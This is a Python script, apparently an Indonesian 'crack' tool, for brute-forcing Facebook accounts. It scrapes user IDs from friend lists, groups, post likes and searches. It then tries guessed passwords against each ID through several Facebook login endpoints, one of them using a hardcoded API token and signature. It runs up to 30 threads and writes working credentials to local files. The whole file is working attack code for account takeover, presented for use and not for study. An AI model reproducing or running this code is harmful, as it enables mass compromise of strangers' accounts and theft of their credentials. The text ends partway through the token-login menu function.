# script bruteforce simpel
## python 3.9
## class cookies
logo="""
\033[97m                                       
.---.                                  
|   |.--.               __.....__      
|   ||__|           .-''         '.    
|   |.--.     .|   /     .-''"'-.  `.  
|   ||  |   .' |_ /     /________\   \ 
|   ||  | .'     ||                  | 
|   ||  |'--.  .-'\    .-------------' 
|   ||  |   |  |   \    '-.____...---. 
|   ||__|   |  |    `.             .'  
'---'       |  '.'    `''-...... -'    
            |   /                      
            `'-'                       """
import requests,os,sys,time,re,bs4,json;from concurrent.futures import ThreadPoolExecutor as Tai;id=[];cookie=[];req=requests.Session();putih="\033[97m";merah="\033[91m";hijau="\033[92m";kuning="\033[93m";oks=[];cps=[];prem=[];garis="\033[97m~"*40;biru="\033[94m";token=[];cr=[];die=[];asil=[];ungu="\033[95m"
def config(url):
    try:return req.get(url,cookies={"cookie":cookie[0]}).text
    except requests.exceptions.ConnectionError:sys.exit(f"\n{putih}[{merah}×{putih}] Ssl Connection Error\n")
def login(url):
    try:cookie.append(json.loads(open("config.json","r").read())["CooKie"]);menu(url)
    except FileNotFoundError:
        os.system("clear");print(logo)
        print(f"{garis}\n{biru}[{putih}*{biru}]{putih} Login Dulu Bro\n{biru}[{putih}*{biru}]{putih} Login Pake CooKie Facebook\n{biru}[{putih}*{biru}]{putih} Cara Ambil CooKie {hijau}www.youtube.com\n{garis}\n")
        cok=input(f"{putih}[{hijau}?{putih}] CooKie Fb : {hijau}")
        try:ses=req.get(url.format("/me"),cookies={"cookie":cok}).text
        except requests.exceptions.ConnectionError:sys.exit(f"\n{putih}[{merah}×{putih}] Ssl Connection Error\n")
        try:re.findall(r'name="target" value=\"(\d+)\"',ses)[0];cookie.append(cok);open("config.json","w").write(json.dumps({"CooKie":cok}));print(f"\n{putih}[{hijau}✓{putih}] CooKie Benar");time.sleep(3);language(url)
        except IndexError:print(f"\n{putih}[{merah}×{putih}] CooKie Salah\n");time.sleep(2);login(url)       
def language(url):
    for x in bs4.BeautifulSoup(config(url.format("/language.php")),"html.parser").find_all("a",href=True):
        if "id_ID&" in x["href"]:config(url.format(x["href"]));break
        elif "id_ID&" not in x["href"]:break
    menu(url)
def menu(url):
    os.system("clear");http=config(url.format("/me"))
    if "Harap Konfirmasikan Identitas Anda" in http:print(f"\n{putih}[{merah}×{putih}] Akun Kamu Kena Checkpoint\n");os.remove("config.json");time.sleep(2);login(url)
    else:
        try:name=re.findall(r"<title\>(.*?)\</title>",http)[0];ids=re.findall(r'name="target" value=\"(\d+)\"',http)[0]
        except IndexError:print(f"\n{putih}[{merah}×{putih}] Terjadi Kesalahan Saat Masuk\n");os.remove("config.json");time.sleep(2);login(url)
    print(logo);print(garis)
    print(f"{biru}[{putih}*{biru}]{putih} User Name :{hijau} {name}")
    print(f"{biru}[{putih}*{biru}]{putih} User Ids  :{hijau} {ids}")
    print(f"{biru}[{putih}*{biru}]{putih} User Tipe : {hijau}{prem[0]}\n{garis}\n")
    print(f"[01] Crack Dari Daftar Teman")
    print(f"[02] Crack Dari Daftar Teman Publik")
    print(f"[03] Crack Dari Member Grup")
    print(f"[04] Crack Dari Like Postingan")
    print(f"[05] Crack Dari Pencarian Nama")
    print(f"[06] Remove CooKies & LoginOut")
    print(f"[00] Exciting This Program\n")
    memek(url)
def memek(url):
    p=input(f"{putih}[{hijau}?{putih}] Your Chose :{hijau} ")
    if p == "":print(f"{putih}[{merah}×{putih}] Jangan Kosong Dong Goblok");time.sleep(2);memek(url)
    elif p == "1" or p == "01":tem(url)
    elif p == "2" or p == "02":pub(url)
    elif p == "3" or p == "03":grup(url)
    elif p == "4" or p == "04": like(url)
    elif p == "5" or p == "05":cari(url)
    elif p == "6" or p == "06":os.remove("config.json");time.sleep(2);masuk()
    elif p == "0" or p == "00":print(f"\n{putih}[{kuning}!{putih}] Good Bye Slur");sys.exit(2)
    else:print(f"{putih}[{merah}×{putih}] Pilihan {p} Is Not Found");time.sleep(2);memek(url)
def tem(url):
    os.system("clear");print(logo);me=url.format('/friends/center/friends/');ses=config(me)
    try:jumlah=re.findall(r"\>(\d+)\ Teman<",ses)[0]
    except IndexError:print("\n{putih}[{merah}×{putih}] Maaf Kamu Tidak Memiliki Teman\n");time.sleep(2);menu(url)
    if "." in jumlah:jumlah=jumlah.replace(".","");print(f"{garis}\n{biru}[{putih}*{biru}]{putih} Jumlah Teman : {kuning}{jumlah}\n{biru}[{putih}*{biru}]{putih} Maximal Crack {kuning}3000\n{garis}\n")
    else:print(f"{garis}\n{biru}[{putih}*{biru}]{putih} Total Teman : {kuning}{jumlah}\n{biru}[{putih}*{biru}]{putih} Max Crack   : {kuning}3000\n{garis}\n")
    try:get=int(input(f"{putih}{putih}[{hijau}?{putih}] Mau Crack Berapa :{hijau} "))
    except ValueError:print(f"{putih}[{merah}×{putih}] Hanya Boleh Menggunakan Angka");time.sleep(2);tem(url)
    while True:
        print(f"\r{putih}[{hijau}#{putih}] Mengambil Id     :{hijau} {len(id)}",end="")
        if len(id) > get:break
        ses=config(me)
        if "Harap Konfirmasikan Identitas Anda" in ses or "checkpoint" in ses:
            if len(id) > 1:time.sleep(2);break
            else:print(f"\n{putih}[{merah}×{putih}] Akun Kamu Kena Checkpoint \n");os.remove("config.json");time.sleep(2);login(url)
        elif 'Anda Tidak Dapat Menggunakan Fitur Ini Sekarang' in ses:
            if len(id) > 1:time.sleep(2);break
            else:print(f"\n{putih}[{merah}×{putih}] Akun Ini Mencapai Batas,Harap Beralih Akun\n");time.sleep(2);menu(url)
        elif "Konten Tidak Ditemukan" in ses:
            if len(id) > 1:time.sleep(2);break
            else:print(f"\n{putih}[{merah}×{putih}] Konten Tidak Ditemukan, Silahkan Pilih Fitur Lain\n");time.sleep(2);menu(url)
        else:
            try:tod=re.findall(r'style="vertical-align: middle"><a class=\"(.*?)\" href="\/(.*?)\"\>(.*?)\</a>',ses)
            except IndexError:print(f"\n{putih}[{merah}×{putih}] Maaf Terjadi Kesalahan\n");time.sleep(2);menu(url)
            for ngen in tod:
                uid=re.findall(r'uid\=(.*?)\&',ngen[1]);id.append(f"{uid[0]}|{ngen[2]}")
        if 'Lihat selengkapnya' in ses:me=url.format(bs4.BeautifulSoup(ses,"html.parser").find("a",string="Lihat selengkapnya").get("href"))
        else:break
    crack(url)
def pub(url):
    os.system("clear");print(logo)
    print(f"{garis}\n{putih}[{biru}!{putih}] Masukkan Id / Username Orang Lain")
    print(f"{putih}[{biru}!{putih}] Pastikan Pengguna Memiliki Teman\n{garis}\n")
    ids=input(f"{putih}[{hijau}?{putih}] Input Id : {hijau}")
    if ids == "":print(f"\n{putih}[{merah}×{putih}] Jangan Kosong Dong Goblok");time.sleep(2);pub(url)
    elif "1000" in ids:me=url.format(f"/profile.php?id={ids}&v=friends")
    elif "1000" not in ids:me=url.format(f"/{ids}/friends")
    try:ses=config(me);jumlah=re.findall(r">Teman \((.*?)\)<",ses)[0];nama=re.findall(r"<title\>(.*?)\</title>",ses)[0]
    except IndexError:print(f"\n{putih}[{merah}×{putih}] Pengguna dengan id {ids} Tidak Memiliki Teman");time.sleep(2);pub(url)
    if "." in jumlah:jumlah=jumlah.replace(".","");print(f"{garis}\n{biru}[{putih}*{biru}]{putih} User Name   : {kuning}{nama}\n{biru}[{putih}*{biru}]{putih} Total Teman : {kuning}{jumlah}\n{biru}[{putih}*{biru}]{putih} Max Crack   : {kuning}3000\n{garis}\n")
    else:print(f"{garis}\n{biru}[{putih}*{biru}]{putih} User Name   : {kuning}{nama}\n{biru}[{putih}*{biru}]{putih} Total Teman : {kuning}{jumlah}\n{biru}[{putih}*{biru}]{putih} Max Crack   :{kuning} 3000\n{garis}\n")
    try:get=int(input(f"{putih}{putih}[{hijau}?{putih}] Mau Crack Berapa :{hijau} "))
    except ValueError:print(f"{putih}[{merah}×{putih}] Hanya Boleh Menggunakan Angka");time.sleep(2);pub(url)
    while True:
        print(f"\r{putih}[{hijau}#{putih}] Mengambil Id     : {hijau}{len(id)}",end="")
        if len(id) > get:break
        ses=config(me)
        if "Harap Konfirmasikan Identitas Anda" in ses or "checkpoint" in ses:
            if len(id) > 1:time.sleep(2);break
            else:print(f"\n{putih}[{merah}×{putih}] Akun Kamu Kena Checkpoint \n");os.remove("config.json");time.sleep(2);login(url)
        elif 'Anda Tidak Dapat Menggunakan Fitur Ini Sekarang' in ses:
            if len(id) > 1:time.sleep(2);break
            else:print(f"\n{putih}[{merah}×{putih}] Akun Ini Mencapai Batas,Harap Beralih Akun\n");time.sleep(2);menu(url)
        elif "Konten Tidak Ditemukan" in ses:
            if len(id) > 1:time.sleep(2);break
            else:print(f"\n{putih}[{merah}×{putih}] Konten Tidak Ditemukan, Silahkan Pilih Fitur Lain\n");time.sleep(2);menu(url)
        else:
            try:tod=re.findall(r'style="vertical-align: middle"><a class=\"(.*?)\" href=\"(.*?)\"\>(.*?)\</a>',ses)
            except IndexError:print(f"{putih}[{merah}×{putih}] Maaf Terjadi Kesalahan");time.sleep(2);menu(url)
            for ngen in tod:
                if "profile.php" in ngen[1]:uid=re.findall(r"id\=(.*?)\&",ngen[1])
                else:uid=re.findall(r"\/(.*?)\?",ngen[1])
                id.append(f"{uid[0]}|{ngen[2]}")
        if 'Lihat Teman Lain' in ses:me=url.format(bs4.BeautifulSoup(ses,"html.parser").find("a",string="Lihat Teman Lain").get("href"))
        else:break
    crack(url)
def like(url):
    os.system("clear");print(logo)
    print(f"{garis}\n{biru}[{putih}*{biru}]{putih} Masukkan Link Postingan")
    print(f"{biru}[{putih}*{biru}]{putih} {putih}Pastikan Postingan Tersebut Memiliki Like\n{garis}\n")
    ids=input(f"{putih}[{hijau}?{putih}] Link Postingan :{hijau} ")
    try:domain=re.findall(r"/\/(.*?)\/",ids)[0];me=ids.replace(domain,"mbasic.facebook.com")
    except IndexError:print(f"\n{putih}[{merah}×{putih}] Link Postingan Salah!, Input Yang Benar");time.sleep(2);like(url)
    ses=config(me)
    if "Harap Konfirmasikan Identitas Anda" in ses or "checkpoint" in ses:print(f"\n{putih}[{merah}×{putih}] Akun Kamu Kena Checkpoint \n");os.remove("config.json");time.sleep(2);login(url)
    elif 'Anda Tidak Dapat Menggunakan Fitur Ini Sekarang' in ses:print(f"\n{putih}[{merah}×{putih}] Akun Ini Mencapai Batas,Harap Beralih Akun\n");time.sleep(2);menu(url)
    elif "Konten Tidak Ditemukan" in ses or "Situs ini tidak dapat dijangkau" in ses:print(f"\n{putih}[{merah}×{putih}] Konten Tidak Ditemukan, Silahkan Pilih Fitur Lain\n");time.sleep(2);menu(url)
    else:
        if "/ufi/reaction/profile/browser/" in ses:ufi=re.findall(r'<a href="/ufi/reaction/profile/browser\/(.*?)\"',ses)[0];me=url.format(f"/ufi/reaction/profile/browser/{ufi}")
        else:print(f"\n{putih}[{merah}×{putih}] Postingan Tidak Memiliki Like");time.sleep(2);like(url)
    try:jumlah=re.findall(r"total_count\=(\d+)\&",config(me))[0]
    except IndexError:print(f"\n{putih}[{merah}×{putih}] Postingan Tidak Memiliki Like");time.sleep(2);like(url)
    if "." in jumlah:jumlah=jumlah.replace(".","");print(f"{garis}\n{biru}[{putih}*{biru}]{putih} Jumlah Like : {kuning}{jumlah}\n{biru}[{putih}*{biru}]{putih} Max Crack   : {kuning}3000\n{garis}")
    else:print(f"{garis}\n{biru}[{putih}*{biru}]{putih} Jumlah Like : {kuning}{jumlah}\n{biru}[{putih}*{biru}]{putih} Max Crack   : {kuning}3000\n{garis}\n")
    try:get=int(input(f"{putih}{putih}[{hijau}?{putih}] Mau Crack Berapa :{hijau} "))
    except ValueError:print(f"{putih}[{merah}×{putih}] Hanya Boleh Menggunakan Angka");time.sleep(2);like(url)
    while True:
        print(f"\r{putih}[{hijau}#{putih}] Mengambil Id     :{hijau} {len(id)}",end="")
        if len(id) > get:break
        ses=config(me)
        if "Harap Konfirmasikan Identitas Anda" in ses or "checkpoint" in ses:
            if len(id) > 1:time.sleep(2);break
            else:print(f"\n{putih}[{merah}×{putih}] Akun Kamu Kena Checkpoint \n");os.remove("config.json");time.sleep(2);login(url)
        elif 'Anda Tidak Dapat Menggunakan Fitur Ini Sekarang' in ses:
            if len(id) > 1:time.sleep(2);break
            else:print(f"\n{putih}[{merah}×{putih}] Akun Ini Mencapai Batas,Harap Beralih Akun\n");time.sleep(2);menu(url)
        elif "Konten Tidak Ditemukan" in ses:
            if len(id) > 1:time.sleep(2);break
            else:print(f"\n{putih}[{merah}×{putih}] Konten Tidak Ditemukan, Silahkan Pilih Fitur Lain\n");time.sleep(2);menu(url)
        else:
            try:tod=re.findall(r'<h3 class=\"(.*?)\"><a href="\/(.*?)\"\>(.*?)\</a></h3>',ses)
            except IndexError:print(f"\n{putih}[{merah}×{putih}] Maaf Terjadi Kesalahan\n");time.sleep(2);menu(url)
            for ngen in tod:
                if "profile.php?id" in ngen[1]:uid=re.findall(r"id\=(\d+)",ngen[1])[0]
                else:
                    if "?" in ngen[1]:uid=ngen[1].split('?')[0]
                    else:uid=ngen[1]
                id.append(f"{uid}|{ngen[2]}")
        if "Lihat Selengkapnya" in ses:me=url.format(bs4.BeautifulSoup(ses,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
        else:break
    crack(url)
def cari(url):
    os.system("clear");print(logo)
    print(f"{garis}\n{biru}[{putih}*{biru}]{putih} {putih}Masukkan Nama Pengguna Yg mau Dicari")
    print(f"{biru}[{putih}*{biru}]{putih} {putih}Terserah Aja Mau Masukin Nama Siapa\n{garis}\n")
    ids=input(f"{putih}[{hijau}?{putih}] Mau Cari Siapa   : {hijau}")
    if ids == "":print(f"\n{putih}[{merah}×{putih}] Jangan Kosong Dong Goblok");time.sleep(2);cari(url)
    if " " in ids:ids=ids.replace(" ","%20");me=url.format(f"/search/people/?q={ids}")
    else:me=url.format(f"/search/people/?q={ids}")
    try:get=int(input(f"{putih}{putih}[{hijau}?{putih}] Mau Crack Berapa :{hijau} "))
    except ValueError:print(f"{putih}[{merah}×{putih}] Hanya Boleh Menggunakan Angka");time.sleep(2);cari(url)
    while True:
        print(f"\r{putih}[{hijau}#{putih}] Mengambil Id     :{hijau} {len(id)}",end="")
        if len(id) > get:break
        ses=config(me)
        if "Harap Konfirmasikan Identitas Anda" in ses or "checkpoint" in ses:
            if len(id) > 1:time.sleep(2);break
            else:print(f"\n{putih}[{merah}×{putih}] Akun Kamu Kena Checkpoint \n");os.remove("config.json");time.sleep(2);login(url)
        elif 'Anda Tidak Dapat Menggunakan Fitur Ini Sekarang' in ses:
            if len(id) > 1:time.sleep(2);break
            else:print(f"\n{putih}[{merah}×{putih}] Akun Ini Mencapai Batas,Harap Beralih Akun\n");time.sleep(2);menu(url)
        elif "Konten Tidak Ditemukan" in ses:
            if len(id) > 1:time.sleep(2);break
            else:print(f"\n{putih}[{merah}×{putih}] Konten Tidak Ditemukan, Silahkan Pilih Fitur Lain\n");time.sleep(2);menu(url)
        else:
            try:tod=re.findall(r'class="bf co"><a href=\"(.*?)\"><div class="cp"><div class="cq"\>(.*?)\</div>',ses)
            except IndexError:print(f"\n{putih}[{merah}×{putih}] Maaf Terjadi Kesalahan\n");time.sleep(2);menu(url)
            for ngen in tod:
                if "profile.php" in ngen[0]:uid=re.findall(r"id\=(.*?)\&",ngen[0])
                else:uid=re.findall(r"\/(.*?)\?",ngen[0])
                id.append(f"{uid[0]}|{ngen[1]}")
        if "Lihat Hasil Selanjutnya" in ses:me=bs4.BeautifulSoup(ses,"html.parser").find("a",string="Lihat Hasil Selanjutnya").get("href")
        else:break
    crack(url)
def grup(url):
    os.system("clear");print(logo)
    print(f"{garis}\n{biru}[{putih}*{biru}]{putih} Masukkan Id Grup Dulu Bro"),
    print(f"{putih}{biru}[{putih}*{biru}]{putih} Id Grup Hanya Berisi Angka\n{garis}\n")
    ids=input(f"{putih}[{hijau}?{putih}] Id Grup :{hijau} ")
    if ids == "":print(f"\n{putih}[{merah}×{putih}] Jangan Kosong Dong Goblok");time.sleep(2);grup(url)
    ses=config(url.format(f"/groups/{ids}"))
    if "Harap Konfirmasikan Identitas Anda" in ses or "checkpoint" in ses:print(f"\n{putih}[{merah}×{putih}] Akun Kamu Kena Checkpoint \n");os.remove("config.json");time.sleep(2);login(url)
    elif 'Anda Tidak Dapat Menggunakan Fitur Ini Sekarang' in ses:print(f"\n{putih}[{merah}×{putih}] Akun Ini Mencapai Batas,Harap Beralih Akun\n");time.sleep(2);menu(url)
    elif "Konten Tidak Ditemukan" in ses:print(f"\n{putih}[{merah}×{putih}] Konten Tidak Ditemukan, Silahkan Pilih Fitur Lain\n");time.sleep(2);menu(url)
    nama=re.findall(r"<title\>(.*?)\</title>",ses)[0]
    print(f"\n{garis}\n{biru}[{putih}*{biru}]{putih} {putih}Nama Grup :{kuning} {nama}\n{biru}[{putih}*{biru}]{putih} Max Crack : {kuning}3000\n{garis}\n")
    try:get=int(input(f"{putih}{putih}[{hijau}?{putih}] Mau Crack Berapa :{hijau} "))
    except ValueError:print(f"{putih}[{merah}×{putih}] Hanya Boleh Menggunakan Angka");time.sleep(2);grup(url)
    admin=url.format(f"/browse/group/members/?id={ids}&start=0&listType=list_admin_moderator")
    while True:
        if len(id) > get:break
        ses=config(admin)
        try:tod=re.findall(r'<h3><a class=\"(.*?)\" href=\"(.*?)\"\>(.*?)\</a></h3>',ses)
        except IndexError:break
        for x in tod:
            try:
                if "profile.php" in x[1]:uid=x[1].split("id=")[1]
                else:uid=x[1].split("/")[1]
            except IndexError:continue
            if "mbasic" in uid or "m.face" in uid or "/" in uid or uid == "" or uid in id:continue
            else:id.append(f"{uid}|{x[2]}")
        print(f"\r{putih}[{hijau}#{putih}] Mengambil Id     : {hijau}{len(id)} ",end="")
        if "Lihat Selengkapnya" in ses:admin=url.format(bs4.BeautifulSoup(ses,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
        else:break
    print("");non=url.format(f"/browse/group/members/?id={ids}&start=0&listType=list_nonfriend_nonadmin")
    while True:
        if len(id) > get:break
        ses=config(non)
        try:tod=re.findall(r'<h3><a class=\"(.*?)\" href=\"(.*?)\"\>(.*?)\</a></h3>',ses)
        except IndexError:break
        for x in tod:
            try:
                if "profile.php" in x[1]:uid=x[1].split("id=")[1]
                else:uid=x[1].split("/")[1]
            except IndexError:continue
            if "mbasic" in uid or "m.face" in uid or "/" in uid or uid == "" or uid in id:continue
            else:id.append(f"{uid}|{x[2]}")
        print(f"\r{putih}[{hijau}#{putih}] Mengambil Id     : {hijau}{len(id)} ",end="")
        if "Lihat Selengkapnya" in ses:non=url.format(bs4.BeautifulSoup(ses,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
        else:break
    print("");ivt=url.format(f"/browse/group/members/?id={ids}&start=0&listType=list_invited")
    while True:
        if len(id) > get:break
        ses=config(ivt)
        try:tod=re.findall(r'<h3><a class=\"(.*?)\" href=\"(.*?)\"\>(.*?)\</a></h3>',ses)
        except IndexError:break
        for x in tod:
            try:
                if "profile.php" in x[1]:uid=x[1].split("id=")[1]
                else:uid=x[1].split("/")[1]
            except IndexError:continue
            if "mbasic" in uid or "m.face" in uid or "/" in uid or uid == "" or uid in id:continue
            else:id.append(f"{uid}|{x[2]}")
        print(f"\r{putih}[{hijau}#{putih}] Mengambil Id     : {hijau}{len(id)} ",end="")
        if "Lihat Selengkapnya" in ses:ivt=url.format(bs4.BeautifulSoup(ses,"html.parser").find("a",string="Lihat Selengkapnya").get("href"))
        else:break
    print("");mbr=url.format(f"/groups/{ids}")
    while True:
        if len(id) > get:break
        ses=config(mbr)
        try:tod=re.findall(r'<strong><a href=\"(.*?)\"\>(.*?)\</a></strong>',ses)
        except IndexError:break
        for x in tod:
            try:
                if "profile.php" in x[0]:uid=x[0].split("id=")[1].split("&")[0]
                else:uid=x[0].split("/")[1].split("?")[0]
            except IndexError:continue
            if "mbasic" in uid or "m.face" in uid or "/" in uid or uid == "" or uid in id:continue
            else:id.append(f"{uid}|{x[1]}")
        print(f"\r{putih}[{hijau}#{putih}] Mengambil Id     : {hijau}{len(id)} ",end="")
        if "Lihat Postingan Lainnya" in ses:mbr=url.format(bs4.BeautifulSoup(ses,"html.parser").find("a",string="Lihat Postingan Lainnya").get("href"))
        else:break
    crack(url)
def crack(url):
    for save in id:
        open("cache.txt","a").write(f"{save}\n")
    time.sleep(2);print(f"\n\n{garis}")
    print(f"{biru}[{putih}*{biru}]{putih} Pilih Metode Untuk Crack\n{biru}[{putih}*{biru}]{putih} {putih}No Cekpoint Pilih Nomor 3\n{garis}\n")
    print(f"[01] Crack V1")
    print(f"[02] Crack V2")
    print(f"[03] Crack V3\n")
    opp(url)
def opp(url):
    p=input(f"{putih}[{hijau}?{putih}] Your Chose :{hijau} ")
    if p == "":print(f"{putih}[{merah}×{putih}] Jangan Kosong Goblok");time.sleep(2);opp(url)
    elif p == "1":
        os.system("clear");print(f"{logo}\n{garis}\n{biru}[{putih}*{biru}]{putih} Proses Crack Sedang Berjalan\n{biru}[{putih}*{biru}]{putih} {putih}Hasil Crack OK Tersimpan di File oks.txt\n{biru}[{putih}*{biru}]{putih} {putih}Hasil Crack CP Tersimpan di File cps.txt\n{biru}[{putih}*{biru}]{putih} Untuk berhenti Trap CTRL + Z\n{garis}")
        with Tai(max_workers=30) as kimak:
            for x in id:
                cr.append(x);xn=x.split("|");xz=x.replace("|"," ").split();pewe=[xz[1]+"12",xz[1]+"123",xz[1]+"1234",xz[1]+"12345","sayang","Kontol","Anjing","Bangsat","Freefire"]
                for pz in pewe:
                    kimak.submit(api,xn[0],pz)
        hasil()
    elif p == "2":
        os.system("clear");print(f"{logo}\n{garis}\n{biru}[{putih}*{biru}]{putih} Proses Crack Sedang Berjalan\n{biru}[{putih}*{biru}]{putih} {putih}Hasil Crack OK Tersimpan di File oks.txt\n{biru}[{putih}*{biru}]{putih} {putih}Hasil Crack CP Tersimpan di File cps.txt\n{biru}[{putih}*{biru}]{putih} Untuk berhenti Trap CTRL + Z\n{garis}")
        with Tai(max_workers=30) as kimak:
            for x in id:
                cr.append(x);xn=x.split("|");xz=x.replace("|"," ").split();pewe=[xz[1]+"12",xz[1]+"123",xz[1]+"1234",xz[1]+"12345","sayang","Kontol","Anjing","Bangsat","Freefire"]
                for pz in pewe:
                    kimak.submit(mfb,xn[0],pz)
        hasil()
    elif p == "3":
        os.system("clear");print(f"{logo}\n{garis}\n{biru}[{putih}*{biru}]{putih} Proses Crack Sedang Berjalan\n{biru}[{putih}*{biru}]{putih} {putih}Hasil Crack OK Tersimpan di File oks.txt\n{biru}[{putih}*{biru}]{putih} {putih}Hasil Crack CP Tersimpan di File cps.txt\n{biru}[{putih}*{biru}]{putih} Untuk berhenti Trap CTRL + Z\n{garis}")
        for x in id:
            cr.append(x);xn=x.split("|");xz=x.replace("|"," ").split();pewe=[xz[1]+"12",xz[1]+"123",xz[1]+"1234",xz[1]+"12345","sayang","Kontol","Anjing","Bangsat","Freefire"]
            for pz in pewe:
                mbasic(xn[0],pz)
        hasil()
    else:print(f"{putih}[{merah}×{putih}] Maaf Pilihan {p} Tidak Ada");time.sleep(1);opp(url)
def api(user,pz):
    print(f"\r{putih}[{hijau}?{putih}] CRACK:-{ungu}{len(cr)}{putih} OK:-{hijau}{len(oks)}{putih} CP:-{kuning}{len(cps)}{putih} DIE:-{merah}{len(die)} ",end="")
    req=requests.Session();req.headers.update({"Host":"b-api.facebook.com","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 13_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Mobile/15E148 Safari/604.1","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"none","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"});ses=req.get("https://b-api.facebook.com/method/auth.login",params={"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","format": "JSON","sdk_version": "2","email":user,"locale": "en_US","password":pz,"sdk": "ios","generate_session_cookies": "1","sig": "3f555f99fb61fcd7aa0c44f58f522ef6"})
    if "EAAA" in ses.text:print(f"\n{putih}[ {hijau}OKS{putih} ] {user} | {pz}");open("oks.txt","a").write(f"[ OKS ] {user} | {pz}\n");oks.append(user);asil.append(f"{putih}[ {hijau}OKS{putih} ] {user} | {pz}")
    elif "www.facebook.com" in ses.json()["error_msg"]:open("cps.txt","a").write(f"[ CPS ] {user} | {pz}\n");cps.append(user);asil.append(f"{putih}[{kuning} CPS{putih} ] {user} | {pz}")
    else:die.append(user)
def mbasic(user,pz):
    print(f"\r{putih}[{hijau}?{putih}] CRACK:-{ungu}{len(cr)}{putih} OK:-{hijau}{len(oks)}{putih} CP:-{kuning}{len(cps)}{putih} DIE:-{merah}{len(die)} ",end="")
    req=requests.Session();req.headers.update({"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (iPhone; CPU iPhone OS 13_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Mobile/15E148 Safari/604.1","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"none","sec-fetch-mode":"navigate","sec-fetch-user":"??1","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"});a=req.get("https://mbasic.facebook.com/login/??next&ref=dbl&fl&refid=8").text;data={"lsd":re.findall(r'name="lsd" value=\"(.*?)\"',str(a))[0],"jazoest":re.findall(r'name="jazoest" value=\"(\d+)\"',str(a))[0],"m_ts":re.findall(r'name="m_ts" value=\"(.*?)\"',str(a))[0],"li":re.findall(r'name="li" value=\"(.*?)\"',str(a))[0],"try_number":re.findall(r'name="try_number" value=\"(\d+)\"',str(a))[0],"unrecognized_tries":re.findall(r'name="unrecognized_tries" value=\"(\d+)\"',str(a))[0],"email":user,"pass":pz};action="https://mbasic.facebook.com{}".format(re.findall(r'form method="post" action=\"(.*?)\"',a)[0]);ses=req.post(action,data=data).text
    if "save-device" in ses or "regular_login" in ses:print(f"\n{putih}[{hijau} OKS{putih} ] {user} | {pz}");exit=req.get("https://mbasic.facebook.com/me").text;keluar=re.findall(r'id="mbasic_logout_button"\>(.*?)\<',exit)[0];next=bs4.BeautifulSoup(exit,"html.parser").find("a",string=keluar).get("href");req.get(f"https://mbasic.facebook.com{next}");open("oks.txt","a").write(f"[ OKS ] {user} | {pz}\n");oks.append(user);asil.append(f"{putih}[ {hijau}OKS{putih} ] {user} | {pz}")
    elif "Harap Konfirmasikan Identitas Anda" in ses or "checkpoint" in ses:cps.append(user);open("cps.txt","a").write(f"[ CPS ] {user} | {pz}\n");asil.append(f"{putih}[{kuning} CPS{putih} ] {user} | {pz}")
    else:die.append(user)
def mfb(user,pz):
    print(f"\r{putih}[{hijau}?{putih}] CRACK:-{ungu}{len(cr)}{putih} OK:-{hijau}{len(oks)}{putih} CP:-{kuning}{len(cps)}{putih} DIE:-{merah}{len(die)} ",end="")
    req=requests.Session();req.headers.update({"user-agent":"Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36"});ses=req.post("https://mbasic.facebook.com/login.php",data={"email":user,"pass":pz}).text
    if "save-device" in ses or "mbasic_logout_button" in ses:print(f"\n{putih}[ {hijau}OKS{putih} ] {user} | {pz}");open("oks.txt","a").write(f"[ OKS ] {user} | {pz}\n");oks.append(user);asil.append(f"{putih}[ {hijau}OKS{putih} ] {user} | {pz}")
    elif "Harap Konfirmasikan Identitas Anda" in ses or "checkpoint" in ses:cps.append(user);open("cps.txt","a").write(f"[ CPS ] {user} | {pz}\n");asil.append(f"{putih}[{kuning} CPS{putih} ] {user} | {pz}")
    else:die.append(user)
def hasil():
    if len(asil) < 1:sys.exit(f"\n{garis}\n{biru}[{putih}*{biru}] {putih}Tidak Ada Hasil Yang Didapat\n")
    else:
        for x in asil:
            print(x)
        sys.exit(f"\n{garis}\n{biru}[{putih}*{biru}] {putih}Total CP :{kuning} {len(cps)}\n{biru}[{putih}*{biru}] {putih}Total OK :{hijau} {len(oks)}\n")
def http(url):
    try:return req.get(f"{url}?access_token={token[0]}")
    except requests.exceptions.ConnectionError:sys.exit(f"\n{putih}[{merah}×{putih}] SSL connecting Error\n")
def tk_login(url):
    try:token.append(json.loads(open("token.json","r").read())["Token"]);tk_menu(url)
    except FileNotFoundError:
        os.system("clear");print(logo)
        print(f"{garis}\n{biru}[{putih}*{biru}]{putih} Login Dulu Bro\n{biru}[{putih}*{biru}]{putih} Login Pake Token Facebook\n{garis}\n")
        tk=input(f"{putih}[{hijau}?{putih}] Token : ");
        try:req.get(f"{url}/me?access_token={tk}").json()["id"];token.append(tk);open("token.json","w").write(json.dumps({"Token":tk}));print(f"\n{putih}[{hijau}✓{putih}] Token Benar");time.sleep(2);tk_menu(url)
        except KeyError:print(f"\n{putih}[{merah}×{putih}] Token Salah");time.sleep(2);tk_login(url)
def tk_menu(url):
    ses=http(f"{url}/me").json()
    try:ida=ses["id"];mama=ses["name"]
    except KeyError:print(f"\n{putih}[{merah}×{putih}] Invalid Acces Token Please Relogin");time.sleep(2);os.remove("token.json");tk_login(url)
    os.system("clear");print(logo);print(garis)
